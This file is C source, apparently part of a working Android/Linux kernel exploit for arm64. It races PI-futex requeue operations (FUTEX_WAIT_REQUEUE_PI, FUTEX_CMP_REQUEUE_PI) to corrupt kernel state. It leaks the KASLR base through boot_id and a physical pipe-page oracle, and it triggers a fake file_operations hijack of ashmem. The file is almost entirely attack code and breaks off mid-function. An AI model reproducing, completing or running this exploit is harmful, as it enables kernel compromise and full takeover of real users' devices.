#include "common.h"

#ifndef SLIDE_MAX_ATTEMPTS
#define SLIDE_MAX_ATTEMPTS 20
#endif
#ifndef SLIDE_WAIT_NSEC
#define SLIDE_WAIT_NSEC 50000000L
#endif
#define SLIDE_REQUEUE_MAX_POLLS 1000
#define SLIDE_REQUEUE_POLL_USEC 1000
#ifndef SLIDE_PSELECT_NFDS
#define SLIDE_PSELECT_NFDS PSELECT_ROUTE_NFDS
#endif

#if defined(SLIDE_P0_OFFSET_CANDIDATES) && \
    (!defined(PHYS_P0_ORACLE) || !PHYS_P0_ORACLE)
static const uintptr_t slide_p0_offsets[] = {
  SLIDE_P0_OFFSET_CANDIDATES
};
#endif

/*
 * Shared route state — these are extern in common.h so that pselect.c
 * and mcast.c can read/write them from the stack-copy implementations.
 */
static uint32_t slide_f_wait;
static uint32_t slide_f_pi_target;
static uint32_t slide_f_pi_chain;
static atomic_int slide_waiter_ready;
static atomic_int slide_waiter_waiting;
static atomic_int slide_owner_started;
static atomic_int slide_owner_acquired;
static atomic_int slide_deadlock_seen;
static atomic_int slide_waiter_ok;
static atomic_int slide_route_done;
atomic_int slide_waiter_tid;
atomic_int slide_consume_calls;
atomic_int slide_consume_go;
atomic_int slide_consume_seen;
atomic_int slide_consume_lost;
atomic_int slide_consume_enter_sched;
atomic_int slide_consume_stop;
atomic_int slide_consume_sched_ok;
atomic_int slide_consume_last_sched_ret;
atomic_int slide_consume_last_sched_errno;
atomic_int slide_consumer_ready;
atomic_int slide_stack_write_window;
#if defined(REQUIRE_FRESH_P0_SESSION) && REQUIRE_FRESH_P0_SESSION
atomic_uint_fast64_t slide_pselect_started_ns;
int slide_pselect_production_stack;
#endif
int slide_route_nfds = PSELECT_ROUTE_NFDS;
int slide_route_syscall_pad;
uint64_t slide_route_fine_delay_ticks;
#if defined(REQUIRE_FRESH_P0_SESSION) && REQUIRE_FRESH_P0_SESSION
int slide_p0_session_fresh;
#endif
#if defined(PHYS_VIRTUAL_BASE_ORACLE) && PHYS_VIRTUAL_BASE_ORACLE
int p0_virtual_base_probe;
#endif

static int slide_commit_stext(uint64_t stext, const char *source);

#if defined(PHYS_VIRTUAL_BASE_ORACLE) && PHYS_VIRTUAL_BASE_ORACLE
static int slide_commit_virtual_base(uint64_t base, const char *source) {
  if ((base >> 48) != 0xffff || (base & 0x1fffffULL) != 0 ||
      base < KIMAGE_VIRTUAL_BASE_MIN || base > KIMAGE_VIRTUAL_BASE_MAX ||
      base > UINT64_MAX - ASHMEM_FOPS_OFF) {
    pr_warning("virtual base rejected source=%s base=%016llx\n",
               source, (unsigned long long)base);
    return 0;
  }
  kaslr_base = base;
  kaslr_slide = base - KIMAGE_TEXT_BASE;
  kaslr_done = 1;
  app_publish_p0_offset(slide_p0_offset);
  pr_success("slide-kaslr-ok source=%s pid=%d base=%016llx "
             "virtual_slide=%016llx p0_offset=%08zx\n",
             source, getpid(), (unsigned long long)kaslr_base,
             (unsigned long long)kaslr_slide, slide_p0_offset);
  return 1;
}
#endif

void slide_log_child_context(void) {
  char attr[256];
  char enforce[32];
  const char *writer = "pselect";
#if SLIDE_USE_MCAST
  writer = "mcast";
#elif SLIDE_USE_FPSIMD
  writer = "fpsimd";
#endif
  read_first_line("/proc/self/attr/current", attr, sizeof(attr));
  read_first_line("/sys/fs/selinux/enforce", enforce, sizeof(enforce));
  pr_success("slide child context route=%s pid=%d uid=%u euid=%u "
             "gid=%u egid=%u attr=%s enforce=%s\n",
             writer, getpid(), getuid(), geteuid(), getgid(), getegid(),
             attr, enforce);
}

static inline uint64_t slide_read_cntvct(void) {
  uint64_t value;
  __asm__ volatile("isb\n\tmrs %0, cntvct_el0\n\tisb"
                   : "=r"(value) :: "memory");
  return value;
}

void slide_apply_route_fine_delay(void) {
  uint64_t ticks = slide_route_fine_delay_ticks;
  if (!ticks || ticks == UINT64_MAX) {
    return;
  }
  uint64_t start = slide_read_cntvct();
  while (slide_read_cntvct() - start < ticks) {
    __asm__ volatile("yield" ::: "memory");
  }
}

void slide_reset_consume_state(void) {
  atomic_store(&slide_consume_go, 0);
  atomic_store(&slide_consume_seen, 0);
  atomic_store(&slide_consume_lost, 0);
  atomic_store(&slide_consume_enter_sched, 0);
  atomic_store(&slide_consume_stop, 0);
  atomic_store(&slide_consume_calls, 0);
  atomic_store(&slide_consume_sched_ok, 0);
  atomic_store(&slide_consume_last_sched_ret, -1);
  atomic_store(&slide_consume_last_sched_errno, 0);
  atomic_store(&slide_stack_write_window, 0);
#if defined(REQUIRE_FRESH_P0_SESSION) && REQUIRE_FRESH_P0_SESSION
  atomic_store(&slide_pselect_started_ns, 0);
#endif
}

static void slide_reset_route_state(void) {
  slide_f_wait = 0;
  slide_f_pi_target = 0;
  slide_f_pi_chain = 0;
  atomic_store(&slide_waiter_ready, 0);
  atomic_store(&slide_waiter_waiting, 0);
  atomic_store(&slide_owner_started, 0);
  atomic_store(&slide_owner_acquired, 0);
  atomic_store(&slide_deadlock_seen, 0);
  atomic_store(&slide_waiter_ok, 0);
  atomic_store(&slide_route_done, 0);
  atomic_store(&slide_waiter_tid, 0);
  atomic_store(&slide_consumer_ready, 0);
  slide_reset_consume_state();
}

/*
 * Waiter thread — after the futex requeue dance completes and the owner
 * acquires the chain lock, we dispatch to the appropriate stack-copy
 * implementation.  pselect is the default; mcast is gated on
 * SLIDE_USE_MCAST.
 */
static void *slide_waiter_thread(void *arg __attribute__((unused))) {
  int tid = (int)SYSCHK(syscall(SYS_gettid));
  atomic_store(&slide_waiter_tid, tid);

  if (futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("slide waiter lock chain errno=%d\n", errno);
    return NULL;
  }

  atomic_store(&slide_waiter_ready, 1);
  while (!atomic_load(&slide_owner_started)) {
    usleep(1000);
  }

  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_sec += SLIDE_WAIT_NSEC / 1000000000L;
  timeout.tv_nsec += SLIDE_WAIT_NSEC % 1000000000L;
  if (timeout.tv_nsec >= 1000000000L) {
    timeout.tv_sec++;
    timeout.tv_nsec -= 1000000000L;
  }

  atomic_store(&slide_waiter_waiting, 1);
  errno = 0;
  long wait_ret = futex_op(&slide_f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
                           &slide_f_pi_target, 0);
  int wait_errno = errno;
  pr_info("slide wait_requeue_pi ret=%ld errno=%d\n", wait_ret, wait_errno);
  if (wait_ret != -1 || wait_errno != ETIMEDOUT) {
    atomic_store(&slide_route_done, 1);
    return NULL;
  }
  #ifdef DEBUG
  pr_info("slide pi stage=wait-timeout-accepted tid=%d\n", tid);
#endif
  atomic_store(&slide_waiter_ok, 1);
  while (!atomic_load(&slide_deadlock_seen)) {
    __asm__ volatile("yield" ::: "memory");
  }
  #ifdef DEBUG
  pr_info("slide pi stage=waiter-unlock-enter tid=%d\n", tid);
#endif
  if (futex_op(&slide_f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("slide waiter unlock chain errno=%d\n", errno);
    atomic_store(&slide_route_done, 1);
    return NULL;
  }
  #ifdef DEBUG
  pr_info("slide pi stage=waiter-unlock-return tid=%d\n", tid);
#endif
  while (!atomic_load(&slide_owner_acquired)) {
    __asm__ volatile("yield" ::: "memory");
  }
  #ifdef DEBUG
  pr_info("slide pi stage=writer-enter tid=%d\n", tid);
#endif

  /* Dispatch to pselect (default), mcast or fpsimd stack copy. */
#if SLIDE_USE_MCAST
  slide_mcast_stack_copy();
#elif SLIDE_USE_FPSIMD
  slide_fpsimd_stack_copy();
#else
  slide_pselect_stack_copy();
#endif

#ifdef DEBUG
  pr_info("slide pi stage=writer-return tid=%d sched_ok=%d window=%d\n",
          tid, atomic_load(&slide_consume_sched_ok),
          atomic_load(&slide_stack_write_window));
#endif
  atomic_store(&slide_route_done, 1);

  for (;;) {
    sleep(1);
  }
}

static void *slide_owner_thread(void *arg __attribute__((unused))) {
  if (futex_op(&slide_f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("slide owner lock target errno=%d\n", errno);
    return NULL;
  }
#ifdef DEBUG
  pr_info("slide pi stage=owner-target-locked tid=%d\n",
          (int)syscall(SYS_gettid));
#endif

  while (!atomic_load(&slide_waiter_ready)) {
    usleep(1000);
  }

  atomic_store(&slide_owner_started, 1);
#ifdef DEBUG
  pr_info("slide pi stage=owner-chain-lock-enter tid=%d\n",
          (int)syscall(SYS_gettid));
#endif
  if (futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("slide owner lock chain errno=%d\n", errno);
    return NULL;
  }
  atomic_store(&slide_owner_acquired, 1);
#ifdef DEBUG
  pr_info("slide pi stage=owner-chain-lock-return tid=%d\n",
          (int)syscall(SYS_gettid));
#endif

  for (;;) {
    sleep(1);
  }
}

/* --- KASLR leak: boot_id reading ---------------------------------------- */

static int hex_value(char c) {
  if (c >= '0' && c <= '9') {
    return c - '0';
  }
  if (c >= 'a' && c <= 'f') {
    return c - 'a' + 10;
  }
  if (c >= 'A' && c <= 'F') {
    return c - 'A' + 10;
  }
  return -1;
}

uint64_t slide_read_stext(void) {
  char buf[64];
  unsigned char raw[16];
  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    pr_warning("slide boot_id read denied errno=%d\n", errno);
    return 0;
  }

  ssize_t n = read(fd, buf, sizeof(buf) - 1);
  int saved_errno = errno;
  close(fd);
  if (n < 0) {
    pr_warning("slide boot_id read failed errno=%d\n", saved_errno);
    return 0;
  }
  buf[n] = 0;

  int nibble = -1;
  int out = 0;
  for (ssize_t i = 0; i < n && out < 16; i++) {
    int v = hex_value(buf[i]);
    if (v < 0) {
      continue;
    }
    if (nibble < 0) {
      nibble = v;
      continue;
    }
    raw[out++] = (unsigned char)((nibble << 4) | v);
    nibble = -1;
  }
  if (out != 16) {
    pr_warning("slide short boot_id parse out=%d n=%zd\n", out, n);
    return 0;
  }

  uint64_t leaked = 0;
  for (int i = 0; i < 8; i++) {
    leaked |= (uint64_t)raw[i] << (i * 8);
  }
  if ((leaked >> 48) != 0xffff) {
    pr_warning("slide bad leaked pointer=%016llx\n",
               (unsigned long long)leaked);
    return 0;
  }

  uint64_t off = p0_alias_image_offset(SLIDE_NFULNL_LOGGER_NAME);
  uint64_t stext = leaked - off;
  pr_success("slide boot_id_leaked_nfulnl_logger pid=%d value=%016llx stext=%016llx\n",
             getpid(), (unsigned long long)leaked, (unsigned long long)stext);
  pr_success("slide boot_id-derived_stext pid=%d value=%016llx\n",
             getpid(), (unsigned long long)stext);
  return stext;
}

/* --- Child process: creates threads, triggers requeue, reads boot_id ----- */

#if !defined(PHYS_P0_ORACLE) || !PHYS_P0_ORACLE
static uint64_t slide_child_leak_stext(void) {
  slide_reset_route_state();
  pthread_t waiter;
  pthread_t owner;
  pthread_t consumer;
  SYSCHK(pthread_create(&waiter, NULL, slide_waiter_thread, NULL));
  SYSCHK(pthread_create(&owner, NULL, slide_owner_thread, NULL));
#if SLIDE_USE_MCAST
  SYSCHK(pthread_create(&consumer, NULL, slide_mcast_consumer_thread, NULL));
#elif SLIDE_USE_FPSIMD
  SYSCHK(pthread_create(&consumer, NULL, slide_fpsimd_consumer_thread, NULL));
#else
  SYSCHK(pthread_create(&consumer, NULL, slide_pselect_consumer_thread, NULL));
#endif

  while (!atomic_load(&slide_waiter_waiting) ||
         !atomic_load(&slide_owner_started) ||
         !atomic_load(&slide_consumer_ready)) {
    usleep(1000);
  }

  long requeue_ret = 0;
  int requeue_errno = 0;
  int requeue_polls = 0;
  while (requeue_polls < SLIDE_REQUEUE_MAX_POLLS) {
    requeue_polls++;
    errno = 0;
    requeue_ret = futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
                           &slide_f_pi_target, 0);
    requeue_errno = errno;
    if (requeue_ret != 0) {
      break;
    }
    if (requeue_polls < SLIDE_REQUEUE_MAX_POLLS) {
      usleep(SLIDE_REQUEUE_POLL_USEC);
    }
  }
  pr_info("slide cmp_requeue_pi ret=%ld errno=%d polls=%d\n",
          requeue_ret, requeue_errno, requeue_polls);
  if (requeue_ret != -1 || requeue_errno != EDEADLK) {
    return 0;
  }
  atomic_store(&slide_deadlock_seen, 1);

  while (!atomic_load(&slide_route_done)) {
    usleep(1000);
  }
  if (!atomic_load(&slide_waiter_ok)) {
    return 0;
  }

  return slide_read_stext();
}

#endif /* !PHYS_P0_ORACLE */

/* --- Shared fops hijack trigger ------------------------------------------ */

int slide_child_trigger_write(void) {
  pthread_t waiter;
  pthread_t owner;
  pthread_t consumer;
  SYSCHK(pthread_create(&waiter, NULL, slide_waiter_thread, NULL));
  SYSCHK(pthread_create(&owner, NULL, slide_owner_thread, NULL));
#if SLIDE_USE_MCAST
  SYSCHK(pthread_create(&consumer, NULL, slide_mcast_consumer_thread, NULL));
#elif SLIDE_USE_FPSIMD
  SYSCHK(pthread_create(&consumer, NULL, slide_fpsimd_consumer_thread, NULL));
#else
  SYSCHK(pthread_create(&consumer, NULL, slide_pselect_consumer_thread, NULL));
#endif

  while (!atomic_load(&slide_waiter_waiting) ||
         !atomic_load(&slide_owner_started) ||
         !atomic_load(&slide_consumer_ready)) {
    usleep(1000);
  }

  if (SLIDE_REQUEUE_ARM_USEC) {
    usleep(SLIDE_REQUEUE_ARM_USEC);
  }

  long requeue_ret = 0;
  int requeue_errno = 0;
  int requeue_polls = 0;
  while (requeue_polls < SLIDE_REQUEUE_MAX_POLLS) {
    requeue_polls++;
    errno = 0;
    requeue_ret = futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
                           &slide_f_pi_target, 0);
    requeue_errno = errno;
    if (requeue_ret != 0) {
      break;
    }
    if (requeue_polls < SLIDE_REQUEUE_MAX_POLLS) {
      usleep(SLIDE_REQUEUE_POLL_USEC);
    }
  }
  if (requeue_ret != -1 || requeue_errno != EDEADLK) {
    return 0;
  }
  atomic_store(&slide_deadlock_seen, 1);
  while (!atomic_load(&slide_route_done)) {
    usleep(1000);
  }
#if defined(ACCEPT_SCHED_TRIGGER) && ACCEPT_SCHED_TRIGGER
  int sched_ok = atomic_load(&slide_consume_sched_ok) != 0;
  int write_window = atomic_load(&slide_stack_write_window) != 0;
  pr_info("slide downstream verification armed sched_ok=%d write_window=%d\n",
          sched_ok, write_window);
  return atomic_load(&slide_waiter_ok) != 0 && sched_ok;
#else
  return atomic_load(&slide_waiter_ok) != 0 &&
         atomic_load(&slide_stack_write_window) != 0;
#endif
}

/* --- Fops trigger route (also uses the pselect/mcast mechanism) ---------- */

static uint64_t slide_select_route_fine_delay_ticks(void) {
#if defined(FOPS_ROUTE_FINE_DELAY_TICKS)
  static const uint64_t delays[] = {
    FOPS_ROUTE_FINE_DELAY_TICKS
  };
  size_t attempt = 1;
  const char *text = getenv("S23_SUPERVISOR_ATTEMPT");
  if (text && *text) {
    char *end = NULL;
    errno = 0;
    unsigned long value = strtoul(text, &end, 0);
    if (errno || end == text || *end || value == 0) {
      pr_error("bad S23_SUPERVISOR_ATTEMPT value=%s\n", text);
      return UINT64_MAX;
    }
    attempt = value;
  }
  return delays[(attempt - 1) % (sizeof(delays) / sizeof(delays[0]))];
#else
  return 0;
#endif
}

static int slide_override_route_coarse_delay(int *delay) {
  const char *text = getenv("STACK_WRITER_DELAY_USEC");
  if (!text || !*text) {
    return 1;
  }
  char *end = NULL;
  errno = 0;
  long value = strtol(text, &end, 0);
  if (errno || end == text || *end || value < 0 || value > 1000000) {
    pr_error("bad STACK_WRITER_DELAY_USEC value=%s\n", text);
    return 0;
  }
  *delay = (int)value;
  return 1;
}

#if defined(REQUIRE_FRESH_P0_SESSION) && REQUIRE_FRESH_P0_SESSION
static int app_trigger_fops_slide_slot(size_t slot) {
  static size_t delay_index;
  static const int delays[] = {
    70000, 60000, 80000, 40000, 90000, 50000,
    30000, 20000, 75000, 65000, 85000, 55000,
  };
  if (!select_slide_payload_index(slot)) {
    return 0;
  }
  int delay = 0;
#ifdef FOPS_PSELECT_DELAY_USEC
  delay = FOPS_PSELECT_DELAY_USEC;
#elif defined(FOPS_ROUTE_USE_PSELECT_DELAY) && \
    FOPS_ROUTE_USE_PSELECT_DELAY
  const char *forced = getenv("PSELECT_DELAY_USEC");
  if (forced && *forced) {
    char *end = NULL;
    errno = 0;
    long value = strtol(forced, &end, 0);
    if (!errno && end != forced && !*end && value >= 0 &&
        value <= 1000000) {
      delay = (int)value;
    }
  }
#endif
  if (!delay) {
    delay = delays[delay_index % (sizeof(delays) / sizeof(delays[0]))];
  }
  if (!slide_override_route_coarse_delay(&delay)) {
    return 0;
  }
  delay_index++;
  slide_route_fine_delay_ticks = slide_select_route_fine_delay_ticks();
  if (slide_route_fine_delay_ticks == UINT64_MAX) {
    return 0;
  }
  char delay_arg[16];
  snprintf(delay_arg, sizeof(delay_arg), "%d", delay);
  SYSCHK(setenv("SLIDE_ENTER_DELAY_USEC", delay_arg, 1));
  pr_info("app fops slide route slot=%zu parent=%016zx target=%016zx "
          "lock=%016zx delay=%d fine_ticks=%llu\n",
          slot, slide_oracle_parent, slide_oracle_target, fake_lock, delay,
          (unsigned long long)slide_route_fine_delay_ticks);
  app_publish_writer_started();
  return slide_trigger_physical_state();
}

int app_trigger_fops_slide_route(void) {
#if defined(FOPS_REUSE_VERIFIED_PAGE) && \
    FOPS_REUSE_VERIFIED_PAGE
  return app_trigger_fops_slide_slot(P0_ORACLE_PRODUCTION_SLOT);
#else
  return app_trigger_fops_slide_slot(0);
#endif
}

#if (defined(FOPS_ORACLE_DIAG_ONLY) && FOPS_ORACLE_DIAG_ONLY) || \
    (defined(FOPS_DATA_ALIAS_DIAG_ONLY) && \
     FOPS_DATA_ALIAS_DIAG_ONLY)
int app_trigger_fops_oracle_slot(size_t slot) {
  return app_trigger_fops_slide_slot(slot);
}
#endif
#else
int app_trigger_fops_slide_route(void) {
  slide_reset_route_state();
  static size_t delay_index;
  static const int delays[] = {
    70000, 60000, 80000, 40000, 90000, 50000,
    30000, 20000, 75000, 65000, 85000, 55000,
  };
#if defined(CLOSED_FOPS_ROUTE) && CLOSED_FOPS_ROUTE
  slide_oracle_parent = fake_fops;
  slide_oracle_target = data_addr(ASHMEM_MISC_FOPS);
#else
  if (!select_slide_payload_index(0)) {
    return 0;
  }
#endif
  int delay = 0;
#ifdef FOPS_ROUTE_COARSE_DELAY_USEC
  delay = FOPS_ROUTE_COARSE_DELAY_USEC;
#elif defined(FOPS_ROUTE_USE_PSELECT_DELAY) && \
    FOPS_ROUTE_USE_PSELECT_DELAY
  const char *forced = getenv("PSELECT_DELAY_USEC");
  if (forced && *forced) {
    char *end = NULL;
    errno = 0;
    long value = strtol(forced, &end, 0);
    if (!errno && end != forced && !*end && value >= 0 &&
        value <= 1000000) {
      delay = (int)value;
    }
  }
#endif
  if (!delay) {
    delay = delays[delay_index % (sizeof(delays) / sizeof(delays[0]))];
  }
  if (!slide_override_route_coarse_delay(&delay)) {
    return 0;
  }
  delay_index++;
  slide_route_fine_delay_ticks = slide_select_route_fine_delay_ticks();
  if (slide_route_fine_delay_ticks == UINT64_MAX) {
    return 0;
  }
  char delay_arg[16];
  snprintf(delay_arg, sizeof(delay_arg), "%d", delay);
  SYSCHK(setenv("SLIDE_ENTER_DELAY_USEC", delay_arg, 1));
  pr_info("app fops slide route parent=%016zx target=%016zx lock=%016zx "
          "configured_delay=%d fine_ticks=%llu\n",
          slide_oracle_parent, slide_oracle_target, fake_lock, delay,
          (unsigned long long)slide_route_fine_delay_ticks);
  app_publish_writer_started();
  return slide_trigger_physical_state();
}
#endif

/* --- P0 physical KASLR leak ---------------------------------------------- */
#if defined(PHYS_P0_ORACLE) && PHYS_P0_ORACLE

static int slide_leak_physical_base(void) {
  size_t started = gettime_ns();
  if (!prepare_p0_pipe_oracle()) {
    pr_error("p0 physical pipe preparation failed\n");
    return 0;
  }
#if defined(REQUIRE_FRESH_P0_SESSION) && REQUIRE_FRESH_P0_SESSION
#ifdef SLIDE_FRESH_PAGE_ATTEMPTS
  const int fresh_page_attempts = SLIDE_FRESH_PAGE_ATTEMPTS;
#else
  const int fresh_page_attempts = 1;
#endif
  int fresh_attempt = 1;
  int search_batch = 0;
#ifdef SLIDE_KERNEL_PAGE_SEARCH_BATCHES
  const int max_search_batches = SLIDE_KERNEL_PAGE_SEARCH_BATCHES;
#else
  const int max_search_batches = fresh_page_attempts;
#endif
  int refresh_oracle = 0;
  while (fresh_attempt <= fresh_page_attempts &&
         search_batch < max_search_batches) {
#if defined(P0_REFRESH_ORACLE_EACH_FRESH_PAGE) && \
    P0_REFRESH_ORACLE_EACH_FRESH_PAGE
    if (refresh_oracle) {
      reset_pipe_attempt();
      if (!prepare_p0_pipe_oracle()) {
        pr_error("p0 physical pipe refresh failed fresh=%d/%d\n",
                 fresh_attempt, fresh_page_attempts);
        return 0;
      }
      pr_info("p0 pipe oracle refreshed fresh=%d/%d base=%016zx\n",
              fresh_attempt, fresh_page_attempts, pipebuf_page_base);
      refresh_oracle = 0;
    }
#endif
    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
    search_batch++;
    pr_info("p0 page search batch=%d/%d gate_attempt=%d/%d base=%016zx\n",
            search_batch, max_search_batches, fresh_attempt,
            fresh_page_attempts, page_base);
    pr_info("p0 fresh page attempt=%d/%d base=%016zx\n",
            fresh_attempt, fresh_page_attempts, page_base);
    if (!page_base) {
#ifndef SLIDE_KERNEL_PAGE_SEARCH_BATCHES
      fresh_attempt++;
      refresh_oracle = 1;
#endif
      continue;
    }
    if (!slide_trigger_physical_slot(P0_ORACLE_GATE_SLOT)) {
      pr_error("p0 physical pipe gate trigger failed fresh=%d/%d\n",
               fresh_attempt, fresh_page_attempts);
      fresh_attempt++;
      refresh_oracle = 1;
      continue;
    }
    int gate_result = verify_p0_pipe_oracle_gate();
    pr_info("p0 fresh page result=%d attempt=%d/%d\n",
            gate_result, fresh_attempt, fresh_page_attempts);
    if (getenv("P0_ORACLE_GATE_DIAG")) {
      pr_info("p0 physical gate diagnostic result=%d\n", gate_result);
      if (gate_result != 0) {
        slide_restore_physical_oracle();
      }
      return 0;
    }
    if (gate_result == 0) {
      pr_warning("p0 physical pipe reclaim miss fresh=%d/%d\n",
                 fresh_attempt, fresh_page_attempts);
      fresh_attempt++;
      refresh_oracle = 1;
      continue;
    }
    app_publish_p0_dirty();
    if (gate_result < 0) {
      pr_error("p0 physical pipe gate changed unexpected pages\n");
      slide_restore_physical_oracle();
      return 0;
    }
    if (!slide_trigger_physical_slot(P0_ORACLE_PROBE_SLOT)) {
      slide_restore_physical_oracle();
      return 0;
    }
    uintptr_t offset = scan_p0_pipe_oracle();
    if (offset == (uintptr_t)-1) {
      slide_restore_physical_oracle();
      return 0;
    }
#if defined(P0_FINGERPRINT_INVERSE_SLIDE) && \
    P0_FINGERPRINT_INVERSE_SLIDE
    if (offset > P0_ORACLE_PROBE_OFFSET) {
      pr_error("p0 fingerprint source offset exceeds probe source=%08zx "
               "probe=%08llx\n",
               offset, (unsigned long long)P0_ORACLE_PROBE_OFFSET);
      slide_restore_physical_oracle();
      return 0;
    }
    uintptr_t source_offset = offset;
    offset = P0_ORACLE_PROBE_OFFSET - source_offset;
    pr_info("p0 fingerprint inverse source_offset=%08zx probe=%08llx "
            "runtime_slide=%08zx\n",
            source_offset, (unsigned long long)P0_ORACLE_PROBE_OFFSET,
            offset);
#endif
    if (!slide_restore_physical_oracle()) {
      return 0;
    }
    slide_p0_session_fresh = 1;
    size_t elapsed_ms = (size_t)((gettime_ns() - started) / 1000000ULL);
    pr_success("p0 physical elapsed_ms=%zu fresh=%d/%d\n",
               elapsed_ms, fresh_attempt, fresh_page_attempts);
    return slide_commit_stext(KIMAGE_TEXT_BASE + offset, "physical");
  }
  return 0;
#else
  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
  if (!page_base) {
    return 0;
  }
  if (!slide_trigger_physical_slot(P0_ORACLE_GATE_SLOT)) {
    pr_error("p0 physical pipe gate trigger failed\n");
    return 0;
  }
  int gate_result = verify_p0_pipe_oracle_gate();
  if (getenv("P0_ORACLE_GATE_DIAG")) {
    pr_info("p0 physical gate diagnostic result=%d\n", gate_result);
    if (gate_result != 0) {
      slide_restore_physical_oracle();
    }
    return 0;
  }
  if (gate_result == 0) {
    pr_warning("p0 physical pipe reclaim miss\n");
    return 0;
  }
  app_publish_p0_dirty();
  if (gate_result < 0) {
    pr_error("p0 physical pipe gate changed unexpected pages\n");
    slide_restore_physical_oracle();
    return 0;
  }
  if (!slide_trigger_physical_slot(P0_ORACLE_PROBE_SLOT)) {
    slide_restore_physical_oracle();
    return 0;
  }
  uintptr_t offset = scan_p0_pipe_oracle();
  if (offset == (uintptr_t)-1) {
    slide_restore_physical_oracle();
    return 0;
  }
  if (!slide_restore_physical_oracle()) {
    return 0;
  }
  size_t elapsed_ms = (size_t)((gettime_ns() - started) / 1000000ULL);
  pr_success("p0 physical elapsed_ms=%zu\n", elapsed_ms);
  return slide_commit_stext(KIMAGE_TEXT_BASE + offset, "physical");
#endif
}

#if defined(PHYS_VIRTUAL_BASE_ORACLE) && PHYS_VIRTUAL_BASE_ORACLE
static int slide_leak_virtual_base(uintptr_t physical_offset) {
  size_t started = gettime_ns();
  uint64_t ashmem_fops = 0;
  int gate_result = 0;
  int restore_needed = 0;
  int restore_ok = 0;
  int success = 0;
  slide_p0_offset = physical_offset;
  p0_virtual_base_probe = 1;

  if (!prepare_p0_pipe_oracle()) {
    pr_error("p0 virtual pipe preparation failed\n");
    goto out;
  }
  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
  if (!page_base) {
    goto out;
  }
  /* Any attempted rt_mutex write makes this supervisor attempt non-retryable. */
  app_publish_p0_dirty();
  if (!slide_trigger_physical_slot(P0_ORACLE_GATE_SLOT)) {
    pr_error("p0 virtual pipe gate trigger failed\n");
    goto out;
  }
  gate_result = verify_p0_pipe_oracle_gate();
  if (gate_result != 1) {
    pr_error("p0 virtual pipe reclaim gate=%d\n", gate_result);
    if (gate_result != 0) {
      restore_needed = 1;
    }
    goto out;
  }
  restore_needed = 1;
  if (!slide_trigger_physical_slot(P0_ORACLE_PROBE_SLOT)) {
    goto out;
  }
  ashmem_fops = scan_p0_virtual_base_pointer();

out:
  if (restore_needed) {
    restore_ok = slide_restore_physical_oracle();
  }
  p0_virtual_base_probe = 0;
  if (!restore_ok || ashmem_fops <= ASHMEM_FOPS_OFF) {
    return 0;
  }

  uint64_t base = ashmem_fops - ASHMEM_FOPS_OFF;
  if (base > UINT64_MAX - ASHMEM_FOPS_OFF ||
      base + ASHMEM_FOPS_OFF != ashmem_fops) {
    return 0;
  }
  size_t elapsed_ms = (size_t)((gettime_ns() - started) / 1000000ULL);
  pr_success("p0 virtual elapsed_ms=%zu ashmem_fops=%016llx "
             "base=%016llx\n", elapsed_ms,
             (unsigned long long)ashmem_fops,
             (unsigned long long)base);
  success = slide_commit_virtual_base(base, "physical-data");
  return success;
}
#endif
#endif

/* --- Commit and entry point ---------------------------------------------- */

static int slide_commit_stext(uint64_t stext, const char *source) {
  if (stext < KIMAGE_TEXT_BASE) {
    return 0;
  }
  uint64_t slide = stext - KIMAGE_TEXT_BASE;
  if (slide > 0x1f0000ULL || (slide & (SLIDE_KASLR_STEP - 1)) != 0) {
    pr_warning("slide rejected source=%s stext=%016llx slide=%016llx\n",
               source, (unsigned long long)stext,
               (unsigned long long)slide);
    return 0;
  }
  if (strcmp(source, "pselect") == 0 && slide != slide_p0_offset) {
    pr_warning("slide stale boot_id candidate=%08zx leaked_slide=%08llx\n",
               slide_p0_offset, (unsigned long long)slide);
    return 0;
  }
  kaslr_base = stext;
  kaslr_slide = slide;
  slide_p0_offset = slide;
  kaslr_done = 1;
  data_addr_canonical =
      strcmp(source, "tracefs") == 0 || strcmp(source, "physical") == 0;
  if (data_addr_canonical) {
    app_publish_slide_ready();
  } else {
    app_publish_p0_offset(slide_p0_offset);
  }
  pr_success("slide-kaslr-ok source=%s pid=%d base=%016llx "
             "slide=%016llx data_mode=%s\n",
             source, getpid(), (unsigned long long)kaslr_base,
             (unsigned long long)kaslr_slide,
             data_addr_canonical ? "canonical" : "physical-alias");
  return 1;
}

#if !defined(NON_APP)
int slide_leak_kernel_base(void) {
#if defined(PHYS_P0_ORACLE) && PHYS_P0_ORACLE
  const char *forced_offset_arg = getenv("SLIDE_P0_OFFSET");
  if (forced_offset_arg && *forced_offset_arg) {
    char *end = NULL;
    errno = 0;
    unsigned long long value = strtoull(forced_offset_arg, &end, 0);
    if (errno || end == forced_offset_arg || *end || value > 0x1f0000ULL ||
        (value & (SLIDE_KASLR_STEP - 1)) != 0) {
      pr_error("slide invalid forced p0 offset=%s\n", forced_offset_arg);
      return 0;
    }
    const char *gate_page_arg = getenv("P0_GATE_PAGE_STRUCT");
    const char *probe_page_arg = getenv("P0_PROBE_PAGE_STRUCT");
    if (gate_page_arg && probe_page_arg) {
      char *gate_end = NULL;
      char *probe_end = NULL;
      errno = 0;
      p0_gate_page_struct = (uintptr_t)strtoull(
          gate_page_arg, &gate_end, 0);
      p0_probe_page_struct = (uintptr_t)strtoull(
          probe_page_arg, &probe_end, 0);
      if (errno || gate_end == gate_page_arg || *gate_end ||
          probe_end == probe_page_arg || *probe_end) {
        pr_error("slide invalid p0 restore pages gate=%s probe=%s\n",
                 gate_page_arg, probe_page_arg);
        return 0;
      }
    }
    pr_info("slide forced p0 offset=%08llx\n", value);
